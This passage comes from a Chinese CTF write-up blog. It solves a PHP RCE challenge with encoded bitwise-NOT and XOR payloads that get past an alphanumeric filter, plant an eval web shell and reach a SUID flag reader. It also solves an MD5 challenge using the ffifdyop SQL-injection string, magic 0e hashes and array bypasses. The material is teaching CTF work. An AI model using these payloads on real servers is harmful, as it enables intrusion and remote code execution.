+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="keyword">function</span>(<span class="params">io</span>) &#123; <span class="comment">// io 是 Socket.IO 的核心对象</span></span><br><span class="line">    io.<span class="title function_">on</span>(<span class="string">&#x27;connection&#x27;</span>, <span class="function">(<span class="params">socket</span>) =&gt;</span> &#123; <span class="comment">// 监听客户端连接（Socket.IO 固定写法）</span></span><br><span class="line">        socket.<span class="title function_">emit</span>(<span class="string">&#x27;game-message&#x27;</span>, &#123; ... &#125;); <span class="comment">// 给客户端发消息（emit = 发送）</span></span><br><span class="line">        socket.<span class="title function_">on</span>(<span class="string">&#x27;guess&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123; ... &#125;); <span class="comment">// 监听客户端的&#x27;guess&#x27;事件（on = 接收）</span></span><br><span class="line">        socket.<span class="title function_">on</span>(<span class="string">&#x27;punishment-response&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123; ... &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>1.发现 <code>io</code>、<code>socket.emit</code>、<code>socket.on</code> → 确定是 Socket.IO；</p>
+<p>2.<code>socket.emit()</code>&#x2F;<code>socket.on()</code>，就知道要按 Socket.IO 的方式（<code>io()</code> 建连接、<code>emit()</code> 发请求）解题</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 建立连接（必写）</span></span><br><span class="line"><span class="keyword">const</span> socket = <span class="title function_">io</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 给后端发消息（按需写）</span></span><br><span class="line">socket.<span class="title function_">emit</span>(<span class="string">&#x27;事件名&#x27;</span>, &#123; <span class="attr">key</span>: 值 &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 监听后端消息（按需写）</span></span><br><span class="line">socket.<span class="title function_">on</span>(<span class="string">&#x27;事件名&#x27;</span>, <span class="function">(<span class="params">接收的参数</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 处理收到的消息（比如拿flag）</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">            $code=$_GET[&#x27;code&#x27;];</span><br><span class="line">                    if(strlen($code)&gt;40)&#123;              //字数限制</span><br><span class="line">                                        die(&quot;This is too Long.&quot;);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;</span><br><span class="line">                                        die(&quot;NO.&quot;);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @eval($code);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">            highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// ?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>不允许输入数字和字母。</p>
+<p>那怎么让eval执行呢？</p>
+<p>可以用一种方式，或许它确实不是由字母和数字组成（maybe一些符号标点？），但是他表达出来的意思确实是我们想要的命令：</p>
+<p>三种方法：</p>
+<p>取反</p>
+<p>异或</p>
+<p>自增</p>
+<p>1.或许你可以先看看phpinfo有哪些函数被禁用了（具体构造看知识点3）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$_=~%8f%97%8f%96%91%99%90;$_();</span><br></pre></td></tr></table></figure>
+
+<p>system被禁用了</p>
+<p><img src="/images/image-20251227163010489.png" alt="image-20251227163010489"></p>
+<p>2.构造payload</p>
+<p>eval作为一个语言构造器，并不能被当作函数调用，</p>
+<p>比如 <code>eval()</code>、<code>echo()</code>、<code>isset()</code>、<code>include()</code>。 这些不是函数，而是 <strong>PHP 指令的一部分</strong>。它们在代码编译阶段就已经被固定死了。它们没有入口地址，所以你不能用 <code>$a = &quot;eval&quot;; $a();</code> 去找它。</p>
+<p>所以我们assert（想了解这个函数去看知识点4）</p>
+<p>构造出类似这样的payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(assert)(eval($_POST[&quot;cmd&quot;]))；</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%22%9e%8c%8c%9a%8d%8b%22)(~%22%9a%89%9e%93%d7%db%a0%af%b0%ac%ab%a4%dd%9c%92%9b%dd%a2%d6%22)；</span><br></pre></td></tr></table></figure>
+
+
+
+<p>异或太长了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(%22%21%28%28%25%29%29%22^%22%40%5b%5b%40%5b%5d%22)(%22%25%28%21%2c%21%21%21%2b%40%28%28%24%21%23%2d%24%21%21%21%22^%22%40%5e%40%40%09%05%7e%7b%0f%7b%7c%7f%03%40%40%40%03%7c%08%22)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>3.连接蚁剑，</p>
+<p>发现flag啥都没有，是因为</p>
+<h3 id="1-权限限制-Permission-Denied-——-最可能的原因"><a href="#1-权限限制-Permission-Denied-——-最可能的原因" class="headerlink" title="1. 权限限制 (Permission Denied) —— 最可能的原因"></a>1. 权限限制 (Permission Denied) —— <strong>最可能的原因</strong></h3><p>这是 CTF 中最常见的套路。<code>/flag</code> 文件确实存在，但它的权限被设置成了只有 <code>root</code> 用户才能读取。</p>
+<ul>
+<li><strong>如何确认</strong>：在蚁剑终端输入 <code>ls -l /flag</code>。</li>
+<li><strong>看结果</strong>：<ul>
+<li>如果显示 <code>-r-------- 1 root root</code>：说明只有 root 能读，你（www-data）没权限。这时候你需要寻找<strong>提权</strong>路径（比如寻找刚才提到的 <code>/readflag</code> 程序）。</li>
+<li>如果显示 <code>-rwxr-xr-x</code>：说明你可以读，但文件依然为空，那可能是文件本身就被清空了，或者 Flag 在别处。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="2-函数被禁用-Disable-Functions-——-绕过限制"><a href="#2-函数被禁用-Disable-Functions-——-绕过限制" class="headerlink" title="2. 函数被禁用 (Disable Functions) —— 绕过限制"></a>2. 函数被禁用 (Disable Functions) —— <strong>绕过限制</strong></h3><p>如果你能看到文件，权限也对，但是 <code>cat</code> 命令或者蚁剑的文件管理器点开是空的，可能是 PHP 的配置文件 <code>php.ini</code> 禁用了读取文件的函数。</p>
+<ul>
+<li><strong>如何确认</strong>：查看 <code>phpinfo()</code>，搜索 <code>disable_functions</code> 这一项。</li>
+<li><strong>常见的“阉割”列表</strong>：如果里面出现了 <code>system</code>, <code>exec</code>, <code>passthru</code>, <code>shell_exec</code>, <code>file_get_contents</code> 等，说明你无法直接调用系统命令读文件。</li>
+<li><strong>表现</strong>：你执行命令时，返回结果为空，或者提示 <code>function is disabled</code>。</li>
+</ul>
+<p><img src="/images/image-20251227201231091.png" alt="image-20251227201231091"></p>
+<p>所以为了解决问题，我们安装了插件（绕过函数限制），也就解决了第二个可能问题</p>
+<p>ls -&#x2F;  ok</p>
+<p>cat &#x2F;flag   哟不行了，因为有权限啊，第一个可能问题还没解决。</p>
+<p>这个看一眼别人，和看一眼别人的隐私区别还是很大的，所以权限级别不一样嘛。</p>
+<p>看一下根目录，寻找readflag或者类型的运行文件</p>
+<p>4.运行有suid权限的文件</p>
+<p>运行 <code>readflag</code> 这种文件，并不是让你“获得临时 root 权限”（也就是你的身份还是 <code>www-data</code>），而是<strong>这个程序本身在运行那一刻拥有 root 权限</strong>，它替你去读文件，然后把结果告诉你。</p>
+<hr>
+<h3 id="1-它的原理是什么？（SUID-权限）"><a href="#1-它的原理是什么？（SUID-权限）" class="headerlink" title="1. 它的原理是什么？（SUID 权限）"></a>1. 它的原理是什么？（SUID 权限）</h3><p>在 Linux 中，这叫 <strong>SUID (Set User ID)</strong>。</p>
+<ul>
+<li><strong>普通程序</strong>：你运行 <code>cat</code>，<code>cat</code> 的权限就是你的权限（保洁员）。</li>
+<li><strong>SUID 程序</strong>：你运行 <code>readflag</code>，虽然你是保洁员，但 <code>readflag</code> 这个程序被贴上了“总裁特权”的标签。在它运行的几秒钟里，它能打开保洁员打不开的保险柜，把里面的东西读出来给你看。</li>
+</ul>
+<hr>
+<h3 id="2-如何在根目录下精准找到它？"><a href="#2-如何在根目录下精准找到它？" class="headerlink" title="2. 如何在根目录下精准找到它？"></a>2. 如何在根目录下精准找到它？</h3><p>你不能只靠眼睛看，因为有时候它不叫 <code>readflag</code>，可能叫 <code>get_flag</code> 或者一串乱码。你要找的是**“权限里带 s 的绿色文件”**。</p>
+<p>在终端输入这个命令（这是所有 CTF 选手的肌肉记忆）：</p>
+<p>Bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -al /</span><br></pre></td></tr></table></figure>
+
+<p><strong>看结果里的这一段：</strong></p>
+<ul>
+<li>如果权限是 <code>-rwxr-xr-x</code>：这只是个普通文件，没用。</li>
+<li>如果权限是 <code>-rw**s**r-xr-x</code>：看到那个 <strong><code>s</code></strong> 了吗？这就是“特权”的标志！</li>
+</ul>
+<hr>
+<h3 id="4-运行它后会发生什么？"><a href="#4-运行它后会发生什么？" class="headerlink" title="4. 运行它后会发生什么？"></a>4. 运行它后会发生什么？</h3><p>你运行 <code>/readflag</code>，通常会出现以下几种回显：</p>
+<ol>
+<li><strong>直接给 Flag</strong>：最爽的情况，直接 <code>flag{...}</code>。</li>
+<li><strong>验证码&#x2F;交互</strong>：它会说 <code>Please solve this: 10 + 20 = ?</code>。<ul>
+<li><strong>坑点</strong>：蚁剑的终端有时不支持这种交互。</li>
+<li><strong>解决</strong>：用 <code>echo &quot;30&quot; | /readflag</code>（利用管道把答案喂给它）。</li>
+</ul>
+</li>
+<li><strong>参数读取</strong>：它可能需要你指定文件。<ul>
+<li><strong>操作</strong>：<code>/readflag /flag</code>。</li>
+</ul>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">(*) 基础信息</span><br><span class="line">当前路径: /var/www/html</span><br><span class="line">磁盘列表: /</span><br><span class="line">系统信息: Linux out 5.15.0-161-generic #171-Ubuntu SMP Sat Oct 11 08:17:01 UTC 2025 x86_64</span><br><span class="line">当前用户: www-data</span><br><span class="line">(*) 输入 ashelp 查看本地命令</span><br><span class="line">(www-data:/var/www/html) $ cat /flag              //查都没有</span><br><span class="line">(www-data:/var/www/html) $ ls /</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">readflag</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">(www-data:/var/www/html) $ /readflag       //运行一下它</span><br><span class="line">flag&#123;32337c9d-8e6d-42de-b5d6-791fcd592089&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<p>知识点：</p>
+<p><strong>1.动态函数调用</strong></p>
+<p>这涉及 PHP 7 的一个核心特性：<strong>动态函数调用</strong>。</p>
+<ul>
+<li><strong>传统写法</strong>：<code>assert(...);</code></li>
+<li><strong>PHP 7 写法</strong>：<code>(&quot;assert&quot;)(...);</code></li>
+</ul>
+<p>在 PHP 7 中，如果你在括号里放一个字符串，后面紧跟着另一个括号，PHP 会把第一个括号里的字符串当成<strong>函数名</strong>去执行。</p>
+<p><strong>2.知识点二（数字字母绕过）</strong></p>
+<p>目标：**绕过 <code>preg_match(&quot;/[A-Za-z0-9]+/&quot;, $code)</code> **</p>
+<hr>
+<h3 id="1-取反绕过-Bitwise-NOT"><a href="#1-取反绕过-Bitwise-NOT" class="headerlink" title="1. 取反绕过 (Bitwise NOT ~)"></a>1. 取反绕过 (Bitwise NOT <code>~</code>)</h3><ul>
+<li><strong>原理：</strong> 在 PHP 中，<code>~</code> 是按位取反运算符。它会将 8 位二进制数的 <code>0</code> 变为 <code>1</code>，<code>1</code> 变为 <code>0</code>。</li>
+<li><strong>计算过程：</strong><ol>
+<li>字母 <code>a</code> 的 ASCII 码是 <code>97</code>，二进制是 <code>01100001</code>。</li>
+<li>对 <code>01100001</code> 取反，得到 <code>10011110</code>。</li>
+<li><code>10011110</code> 转换成十六进制是 <code>0x9E</code>。</li>
+<li><code>0x9E</code> 是一个不可见字符（非字母非数字）。</li>
+</ol>
+</li>
+<li><strong>代码实现：</strong> <code>(~%9E)</code> 在 PHP 执行时，会先把 <code>%9E</code> 这个不可见字符取反，结果回到了二进制 <code>01100001</code>，即字符 <code>a</code>。</li>
+<li><strong>Payload 构造：</strong> 你想构造 <code>phpinfo</code>，就先对 <code>p, h, p, i, n, f, o</code> 每个字母取反，得到一串 <code>%xx</code> 的编码，最后组合成 <code>(~%8F%8E%8F%8D%8C%9A%8B)();</code>。</li>
+</ul>
+<hr>
+<h3 id="2-异或绕过-XOR"><a href="#2-异或绕过-XOR" class="headerlink" title="2. 异或绕过 (XOR ^)"></a>2. 异或绕过 (XOR <code>^</code>)</h3><ul>
+<li><strong>原理：</strong> 异或运算的规则是“相同为 0，不同为 1”。</li>
+<li><strong>计算过程：</strong><ol>
+<li>字符 <code>?</code> 的 ASCII 是 <code>63</code> (<code>00111111</code>)。</li>
+<li>字符 <code>~</code> 的 ASCII 是 <code>126</code> (<code>01111110</code>)。</li>
+<li>执行 <code>00111111 ^ 01111110</code>，结果是 <code>01000001</code>。</li>
+<li><code>01000001</code> 对应的 ASCII 字符是 <code>p</code>。</li>
+</ol>
+</li>
+<li><strong>绕过逻辑：</strong> 虽然 <code>p</code> 是字母，会被正则拦截，但 <code>?</code> 和 <code>~</code> 都是符号，正则允许通过。</li>
+<li><strong>代码实现：</strong> <code>$a = (&quot;?&quot; ^ &quot;~&quot;);</code> 这行代码里没有任何字母数字，但变量 <code>$a</code> 的值变成了 <code>&quot;p&quot;</code>。通过多次异或拼接，可以拼出 <code>system</code> 等函数名。</li>
+</ul>
+<hr>
+<h3 id="3-自增绕过-Increment"><a href="#3-自增绕过-Increment" class="headerlink" title="3. 自增绕过 (Increment ++)"></a>3. 自增绕过 (Increment <code>++</code>)</h3><ul>
+<li><strong>原理：</strong> PHP 继承了 Perl 的特性，支持对字符串进行自增操作。如果你对字符 <code>&#39;a&#39;</code> 执行 <code>++</code>，它会变成 <code>&#39;b&#39;</code>。</li>
+<li><strong>关键知识：</strong><ol>
+<li><strong>如何获得第一个字符？</strong> PHP 中，如果定义一个变量 <code>$a = [];</code>（空数组），当你把它当字符串用时（例如 <code>&quot;$a&quot;</code>），PHP 会强制转换它为字符串 <code>&quot;Array&quot;</code>。</li>
+<li><strong>提取首字母：</strong> <code>$_ = [].&#39;&#39;;</code> 此时 <code>$_</code> 的值是 <code>&quot;Array&quot;</code>。</li>
+<li><strong>获取 ‘A’：</strong> <code>$_ = $_[0];</code>（取字符串第一个字符，即 <code>A</code>）。</li>
+<li><strong>递增：</strong> <code>$__ = $_; $__++;</code>（此时 <code>$__</code> 变成了 <code>B</code>）。</li>
+</ol>
+</li>
+<li><strong>绕过逻辑：</strong> 利用符号（如 <code>[]</code>, <code>.</code>, <code>_</code>）得到一个初始字母，再通过反复自增，凑齐你需要的 <code>s, y, s, t, e, m</code> 等字母。整个过程不涉及任何硬编码的字母。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$_ = [];          // 定义数组</span><br><span class="line">$_ = $_ . &quot;&quot;;     // 强制转字符串，此时 $_ 是 &quot;Array&quot;</span><br><span class="line">$_ = $_[0];       // 取第一个字符，此时 $_ 是 &quot;A&quot;</span><br><span class="line"></span><br><span class="line">// 如果想要 &#x27;S&#x27; (system 的开头)</span><br><span class="line">$s = $_; </span><br><span class="line">for($i=0; $i&lt;18; $i++)&#123; $s++; &#125; // A 自增 18 次变成 S</span><br><span class="line">echo $s; // 输出 S</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$_=[];$_=$_.&quot;&quot;;$_=$_[0];$__=$_;$__++;$__++;$__++;......(以此类推)</span><br></pre></td></tr></table></figure>
+
+
+
+<ol start="3">
+<li><strong>php可变函数</strong></li>
+</ol>
+<p><strong>“可变函数”</strong>： 如果一个变量后面跟着括号，如 <code>$a()</code>，PHP 会寻找名字叫做“变量 <code>$a</code> 的值”的函数并执行。</p>
+<ul>
+<li><strong>步骤 A：</strong> 使用取反&#x2F;异或&#x2F;自增构造出字符串 <code>&quot;system&quot;</code>，存入变量 <code>$_</code>。</li>
+<li><strong>步骤 B：</strong> 使用取反&#x2F;异或&#x2F;自增构造出字符串 <code>&quot;ls /&quot;</code>，存入变量 <code>$__</code>。</li>
+<li><strong>步骤 C：</strong> 执行 <code>$_($__)</code>。这在底层等同于调用 <code>system(&quot;ls /&quot;)</code>。</li>
+</ul>
+<p>易错点：</p>
+<p>正确语法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_ = &quot;phpinfo&quot;; </span><br><span class="line">$_();</span><br></pre></td></tr></table></figure>
+
+<p>举例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%8f%97%8f%96%91%99%90)()  //code=&quot;phpinfo&quot;()，明显是个字符串，而字符串后面跟括号语法错误，必须是变量</span><br><span class="line"></span><br><span class="line">?code=$_=~%8f%97%8f%96%91%99%90;$_();  //没有关系，即使code里面得到的只是字符串，无法中eval执行，但是phpinfo本身就是个函数，他可以自己执行</span><br></pre></td></tr></table></figure>
+
+<p>其实这里产生了一个问题，为什么异或操作后面加上()就可以被当作函数执行呢？</p>
+<p>那是因为异或的写法 <code>(&quot;a&quot;^&quot;b&quot;)()</code> 触发了 PHP 7 的一个“骚操作”补丁，而取反 <code>(~a)()</code> 因为符号优先级问题，经常触发不了这个补丁，导致报错。</p>
+<p>4.<code>assert()</code>：狡猾的“纠错哨兵”</p>
+<p><code>assert</code> 原本是用来做代码调试的（判断某个条件是否成立），但在 PHP 5 和早期 PHP 7 中，它有一个非常危险的特性。</p>
+<ul>
+<li><strong>它的功能</strong>：如果传给它的参数是<strong>字符串</strong>，它会把这个字符串当作 PHP 代码执行。</li>
+</ul>
+<p>**(**assert)(eval($_POST[“test”]))</p>
+<p>5.&#x2F;readflag</p>
+<p><code>/readflag</code> 是一个<strong>编译好的可执行程序</strong>（就像 Windows 里的 <code>.exe</code> 文件）。当你输入 <code>/readflag</code> 并回车时，计算机会执行这个程序内部写死的逻辑：</p>
+<ol>
+<li><strong>程序启动</strong>：它会立刻向 Linux 系统申请“临时 root 权限”。</li>
+<li><strong>寻找文件</strong>：它在代码里已经写好了：“去打开 <code>/flag</code> 这个文件”。</li>
+<li><strong>读取内容</strong>：它把文件里的字符串（即真正的 Flag）读取到内存中。</li>
+<li><strong>打印输出</strong>：它执行类似 <code>printf</code> 或 <code>echo</code> 的指令，把内容吐在你的屏幕上。</li>
+</ol>
+<p><strong>所以，你运行 <code>/readflag</code> 就等同于执行了一套组合拳：</strong></p>
+<blockquote>
+<p>申请权限 -&gt; 找到 flag 文件 -&gt; 读取内容 -&gt; 打印出来。</p>
+</blockquote>
+<h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><h3 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h3><p>题目：</p>
+<p>1.抓包看到有hint: select * from ‘admin’ where password&#x3D;md5($pass,true)</p>
+<p>md5($pass,true)：</p>
+<p>true和false</p>
+<p>给个经典的绕过：ffifdyop,这个MD5加密后会返回’or’6XXXXXXXXX(这里的XXXXX是一些乱码和不可见字符，是true造成的，false就不是乱码了)</p>
+<p>这里的SQL语句会变成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from `admin` where password=&#x27;&#x27;or&#x27;6XXXXXXXXX&#x27;  </span><br></pre></td></tr></table></figure>
+
+<p>2.绕过后来到了这里：<strong>GET</strong> &#x2F;levels91.php <strong>HTTP&#x2F;1.1</strong></p>
+<p>看到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$a = $GET[&#x27;a&#x27;];</span><br><span class="line">$b = $_GET[&#x27;b&#x27;];</span><br><span class="line"></span><br><span class="line">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class="line">    // wow, glzjin wants a girl friend.</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>发现是md5弱比较绕过，可用科学计数法或者数组</p>
+<p>3.最后来到这里</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p><code>!==</code>严格要求：值不同，类型不同</p>
+<p>md5的<code>===</code>严格要求：md5编码后的值和类型完全相同</p>
+<p>看起来很矛盾，但是可以用 数组或者强碰撞 来解决</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1[]=1&amp;param1[]=2</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<p>知识点：</p>
+<h3 id="1-md5弱比较绕过"><a href="#1-md5弱比较绕过" class="headerlink" title="1.md5弱比较绕过"></a>1.md5弱比较绕过</h3><p>有一些字符串的MD5值为0e开头，</p>
+<ul>
+<li>QNKCDZO</li>
+<li>240610708</li>
+<li>s878926199a</li>
+<li>s155964671a</li>
+<li>s214587387a</li>
+</ul>
+<p>还有MD5和双MD5以后的值都是0e开头的</p>
+<ul>
+<li>CbDLytmyGm2xQyaLNhWn</li>
+<li>770hQgrBOjrcqftrlaZk</li>
+<li>7r4lGXCH2Ksu2JNT3BYM</li>
+</ul>
+<h3 id="2-弱比较绕过"><a href="#2-弱比较绕过" class="headerlink" title="2.弱比较绕过"></a>2.弱比较绕过</h3><h4 id="1-字符串与数字比较"><a href="#1-字符串与数字比较" class="headerlink" title="1.字符串与数字比较"></a>1.字符串与数字比较</h4><p>当一个<strong>数字</strong>和一个<strong>字符串</strong>用 <code>==</code> 比较时，PHP 会尝试把字符串转成数字。</p>
+<ul>
+<li><strong>规则</strong>：PHP 会从字符串的<strong>开头</strong>开始找数字。如果开头有数字，就截取出来；如果开头没数字，就当做 <code>0</code>。</li>
+<li><strong>例子</strong>：<ul>
+<li><code>123 == &quot;123&quot;</code> → <code>true</code>（很正常）</li>
+<li><code>123 == &quot;123admin&quot;</code> → <code>true</code> （<strong>坑！</strong> PHP 提取了开头的 <code>123</code>，忽略了后面的字母）</li>
+<li><code>0 == &quot;admin&quot;</code> → <code>true</code> （<strong>大坑！</strong> 因为 <code>admin</code> 开头没数字，被转成了 <code>0</code>）</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-布尔值（True-False）"><a href="#2-布尔值（True-False）" class="headerlink" title="2.布尔值（True&#x2F;False）"></a>2.布尔值（True&#x2F;False）</h4><p>这是最危险的一种。如果比较的一方是 <code>true</code>，PHP 会把另一方也转成布尔值。</p>
+<ul>
+<li><strong>规则</strong>：除了 <code>0</code>、空字符串 <code>&quot;&quot;</code>、空数组 <code>[]</code>、<code>null</code> 之外，<strong>几乎所有的东西转成布尔值都是 <code>true</code></strong>。</li>
+<li><strong>例子</strong>：<ul>
+<li><code>true == &quot;any_string&quot;</code> → <code>true</code></li>
+<li><code>true == 123</code> → <code>true</code></li>
+</ul>
+</li>
+<li><strong>应用场景</strong>：如果后端代码写的是 <code>if($password == true)</code>，你随便输入什么字符串都能直接登录。</li>
+</ul>
+<p>PHP 的弱类型比较（<code>==</code>）里的“坑”非常多，除了<strong>科学计数法（0e）</strong>，还有好几种让人哭笑不得的“自作聪明”。</p>
+<p>在 PHP 8.0 之前，这些规则非常混乱，但在 CTF 比赛或旧代码审计中，你经常会遇到以下几种类型：</p>
+<h3 id="1-字符串与数字比较（最常见的坑）"><a href="#1-字符串与数字比较（最常见的坑）" class="headerlink" title="1. 字符串与数字比较（最常见的坑）"></a>1. 字符串与数字比较（最常见的坑）</h3><p>当一个<strong>数字</strong>和一个<strong>字符串</strong>用 <code>==</code> 比较时，PHP 会尝试把字符串转成数字。</p>
+<ul>
+<li><strong>规则</strong>：PHP 会从字符串的<strong>开头</strong>开始找数字。如果开头有数字，就截取出来；如果开头没数字，就当做 <code>0</code>。</li>
+<li><strong>例子</strong>：<ul>
+<li><code>123 == &quot;123&quot;</code> → <code>true</code>（很正常）</li>
+<li><code>123 == &quot;123admin&quot;</code> → <code>true</code> （<strong>坑！</strong> PHP 提取了开头的 <code>123</code>，忽略了后面的字母）</li>
+<li><code>0 == &quot;admin&quot;</code> → <code>true</code> （<strong>大坑！</strong> 因为 <code>admin</code> 开头没数字，被转成了 <code>0</code>）</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="2-十六进制字符串转换"><a href="#2-十六进制字符串转换" class="headerlink" title="2. 十六进制字符串转换"></a>2. 十六进制字符串转换</h3><p>在旧版本的 PHP（PHP 5）中，如果字符串看起来像十六进制（以 <code>0x</code> 开头），比较时也会自动转成十进制数字。</p>
+<ul>
+<li><strong>例子</strong>：<code>&quot;0x1e&quot; == &quot;30&quot;</code> → <code>true</code><ul>
+<li>解析：<code>0x1e</code> 是十六进制的 30，PHP 自动帮你在后台转好了。</li>
+<li><em>注：这种特性在 PHP 7 中已被移除，但在老题目中依然会出现。</em></li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="3-布尔值（True-False）的“万能匹配”"><a href="#3-布尔值（True-False）的“万能匹配”" class="headerlink" title="3. 布尔值（True&#x2F;False）的“万能匹配”"></a>3. 布尔值（True&#x2F;False）的“万能匹配”</h3><p>这是最危险的一种。如果比较的一方是 <code>true</code>，PHP 会把另一方也转成布尔值。</p>
+<ul>
